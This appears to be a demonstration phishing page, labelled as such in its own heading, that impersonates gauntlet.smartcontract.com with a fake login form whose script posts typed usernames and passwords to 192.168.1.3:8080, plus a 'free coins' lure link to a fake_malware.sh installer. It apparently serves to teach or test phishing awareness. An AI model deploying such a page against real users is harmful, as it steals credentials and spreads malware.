<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gauntlet.smartcontract.com</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }

        #login-button {
            position: fixed;
            top: 10px;
            right: 20px;
            background-color: #007bff;
            color: white;
            border: none;
            padding: 5px 15px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        #login-button:hover {
            background-color: #0056b2;
        }

        #login-form {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            z-index: 1000;
            border: 1px solid black;
        }

        #login-form.show {
            display: block;
        }

        #login-form input[type="text"],
        #login-form input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        #login-form button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        #login-form button:hover {
            background-color: #0056b2;
        }
    </style>
</head>

<body>
    <h1>This site impersonates gauntlet.smartcontract.com to demonstrate how it can be used to install malware on users'
        machines and phishing sites.</h1>
    <div id="login-button">Login</div>

    <p>Click <a href="./fake_malware.sh">here</a> and install the software to get free coins!</p>

    <div id="login-form">
        <form id="login-form">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        const loginButton = document.getElementById('login-button');
        const loginForm = document.getElementById('login-form');

        loginButton.addEventListener('click', () => {
            loginForm.style.display = 'block';
        });

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                const response = await fetch('http://192.168.1.3:8080/process-login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }

                const data = await response.json();
                console.log(data);
            } catch (error) {
                console.error('There was a problem with the fetch operation:', error.message);
            }
        });
    </script>
</body>

</html>
